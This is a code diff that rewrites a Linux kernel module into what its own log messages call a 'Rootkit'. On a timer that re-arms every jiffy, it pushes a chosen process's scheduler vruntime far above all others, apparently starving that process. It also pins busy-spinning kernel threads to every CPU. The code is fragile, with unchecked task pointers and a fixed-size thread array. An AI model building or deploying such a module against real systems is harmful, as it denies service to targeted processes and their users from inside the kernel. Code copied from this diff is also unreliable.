@@ -1,98 +1,126 @@
-#include <linux/module.h>        /* Needed by all modules */
-#include <linux/kernel.h>        /* Needed for KERN_INFO */
-#include <linux/sched/signal.h>  /* Needed for for_each_process & pr_info */
-#include <linux/sched.h>  
-#include <linux/rbtree.h>
-#include "cfs_rq.h"
-#include <linux/threads.h>          //used for allow_signal
-#include <linux/kthread.h>          //used for kthread_create
-#include <linux/hrtimer.h>
-#include <linux/ktime.h>
+#define DMESG_ALIAS "ROOTKIT_LOG"
+#define PDEBUG(fmt,args...) printk(KERN_DEBUG "%s: "fmt,DMESG_ALIAS, ##args)
+#define PERR(fmt,args...) printk(KERN_ERR "%s: "fmt,DMESG_ALIAS, ##args)
+#define PINFO(fmt,args...) printk(KERN_INFO "%s: "fmt,DMESG_ALIAS, ##args)
+#define BUILD_BUG_ON_INVALID(e) ((void)(sizeof((__force long)(e))))
+
+
+#include <linux/module.h>
+#include <linux/kernel.h>        
+#include <linux/sched.h>  		
 #include <linux/proc_fs.h>
 #include <linux/pid.h>
-
 #include <linux/pid_namespace.h>
+#include <linux/timer.h>             //kernel mode timer library
+#include <linux/init.h>              //for freeing shared memories
+#include <linux/cpumask.h>
+#include <linux/delay.h>
+#include <linux/kthread.h>
 
-typedef u64 uint64_t;
-
-static struct task_struct* max_virtual_time(void);
-static void find_rightmost(void);
-extern struct rb_node *rb_next(const struct rb_node *);
-extern struct rb_node *rb_last(const struct rb_root *);
-enum hrtimer_restart timer_callback( struct hrtimer *timer_for_restart );
 
 #define __param(type, name, init, msg)	\
 	static type name = init;			\
 	module_param(name, type, 0444);		\
 	MODULE_PARM_DESC(name, msg);
 
-__param(int, pid, 0, "pid number");
+__param(int, pid, 0, "PID number");
 
-
-static int get_current_cpu;
-unsigned long timer_interval_ns = 100;
-static struct hrtimer hr_timer;
-struct pid *pid_struct;
-
-
-
-
-enum hrtimer_restart timer_callback( struct hrtimer *timer_for_restart )
-{
-  	ktime_t currtime , interval;
-  	currtime  = ktime_get();
-  	interval = ktime_set(0,timer_interval_ns); 
-  	hrtimer_forward(timer_for_restart, currtime , interval);
-	find_rightmost();
-	return HRTIMER_RESTART;
-}
-
-
-/*
- *	Prints the number of processes to the kernal log.
+/**
+ * @brief function declerations 
  */
-static void find_rightmost(void) {
-   	
-		struct task_struct* task_list, *rightmost_task, *max;
-		struct rb_node* node;
-		struct rb_node *rightmost=NULL;
+static void update_vruntime(struct timer_list *timer);
+static uint64_t _max_vruntime(void);
+static void init_timer(void);
+static void init_priority_task(void);
+static void init_kthreads(void);
+static int dummy_kthread_func(void* data);
 
-		//Find task by pid
-		pid_struct = find_get_pid(pid);
-		task_list = pid_task(pid_struct,PIDTYPE_PID);
 
-		//Find rightmost task
-		//rightmost= rb_last(&task_list->se.cfs_rq->tasks_timeline.rb_root);
-		
+ /**
+ * @brief variables used in this module
+ */
+static struct task_struct* priority_task;
+static uint64_t vruntime_before = 0;
+static struct timer_list my_timer;
+static long int timer_data = 0;
+struct task_struct* cpu_kthreads[100];
+struct task_struct* cpu_kthreads2[100];
 
-		max = max_virtual_time();
-		task_list->se.vruntime = max->se.vruntime+1000000;
-		
-		/* node is the rightmost node */
-		/*if(rightmost!=NULL){
-			for_each_process(rightmost_task) {
-					if ( &rightmost_task->se.run_node == rightmost) {
-						printk("rightmost task: : %s ; rightmost vruntime: %llu\n", rightmost_task->comm, rightmost_task->se.vruntime);
-						break;
+static uint64_t _max_vruntime(void) {
+	struct task_struct* task;
+	uint64_t max_vruntime = 0;
+    for_each_process(task) {
+        if (task->se.vruntime > max_vruntime && task->state == TASK_RUNNING) {
+			max_vruntime = task->se.vruntime;
+		};
+    }
 
-					}
-			}
-		}*/
+	return max_vruntime;
+}	
 
-			
+
+static void update_vruntime(struct timer_list *timer) {
+	unsigned long flag;
+	uint64_t max_vruntime = 0;	
+	
+	smp_wmb();
+	raw_spin_lock_irqsave(&priority_task->pi_lock, flag);
+	max_vruntime = _max_vruntime();
+	priority_task->se.vruntime = max_vruntime + 100000000000;
+	//printk("----------------------------------------\n");
+	raw_spin_unlock_irqrestore(&priority_task->pi_lock, flag);
+
+	mod_timer(&my_timer, jiffies);
 }
 
-static struct task_struct* max_virtual_time(void) {
-		struct task_struct* task_list, *max;
-		uint64_t max_time = 0;
+static void init_timer(void) {
+	int ret;
+		
+	timer_setup(&my_timer, update_vruntime, timer_data);
+	ret = mod_timer(&my_timer, jiffies);
+	if (ret)
+		PERR("Can't set timer, error occurred\n");
 
-        for_each_process(task_list) {
-                if (task_list->se.vruntime > max_time && task_list->state == TASK_RUNNING) {
-						max_time = task_list->se.vruntime;
-						max = task_list;
-				};
+}
+
+static void init_priority_task(void) {
+	struct pid *pid_struct;
+
+	pid_struct = find_get_pid(pid);
+	priority_task = pid_task(pid_struct, PIDTYPE_PID);
+	
+	// check the validity of the task.
+	// BUILD_BUG_ON_INVALID(priority_task);
+
+	vruntime_before = priority_task->se.vruntime;
+}
+
+static int dummy_kthread_func(void* data) {
+    bool freeze;
+    while (!kthread_freezable_should_stop(&freeze))
+    {
+    }
+    printk(KERN_INFO "Thread Stopping\n");
+    do_exit(0);
+    return 0;
+}
+
+static void init_kthreads(void) {
+	int i;
+    // Creating kthread that are bound to cpu
+    for (i = 0; i < num_online_cpus(); i++) {
+        cpu_kthreads[i] = kthread_create(dummy_kthread_func, NULL, "dummy_kthread");
+        cpu_kthreads2[i] = kthread_create(dummy_kthread_func, NULL, "dummy_kthread2");
+
+
+        kthread_bind(cpu_kthreads[i], i);
+        kthread_bind(cpu_kthreads2[i], i);
+
+        if (cpu_kthreads[i]) {
+            wake_up_process(cpu_kthreads[i]);
+            wake_up_process(cpu_kthreads2[i]);
         }
-		return max;
+    }
 }
 
 
@@ -100,15 +128,15 @@ static struct task_struct* max_virtual_time(void) {
  * Function called when loading the kernal module.
  */
 int init_module(void) {
-        printk(KERN_INFO "plist module loaded.\n");
-		    ktime_t ktime;
-		ktime = ktime_set( 0, timer_interval_ns );
-		hrtimer_init( &hr_timer, CLOCK_MONOTONIC, HRTIMER_MODE_REL );
-		hr_timer.function = &timer_callback;
-		hrtimer_start( &hr_timer, ktime, HRTIMER_MODE_REL );
+	PINFO("Rootkit loaded.\n");
 
-		
-        return 0;
+	init_kthreads();
+
+	init_priority_task();
+
+	init_timer();
+
+    return 0;
 }
 
 
@@ -116,18 +144,14 @@ int init_module(void) {
  * Function called when unloading the kernal module.
  */
 void cleanup_module(void) {
-		printk(KERN_INFO "plist module unloaded.\n");
-		struct task_struct *task;
-		int ret;
-		ret = hrtimer_cancel( &hr_timer );
-		if (ret) printk("The timer was still in use...\n");
-		printk("HR Timer module uninstalling\n");
-				
-		//Find task by pid
-		pid_struct = find_get_pid(pid);
-		task = pid_task(pid_struct,PIDTYPE_PID);
-		task->se.vruntime = task->se.cfs_rq->min_vruntime;
-	}
+	PINFO("Rootkit unloaded.\n");
+	
+	del_timer(&my_timer);
 
+	priority_task->se.vruntime = vruntime_before;
+}
 
+ /**
+ * @brief module descriptions
+ */
 MODULE_LICENSE("GPL");
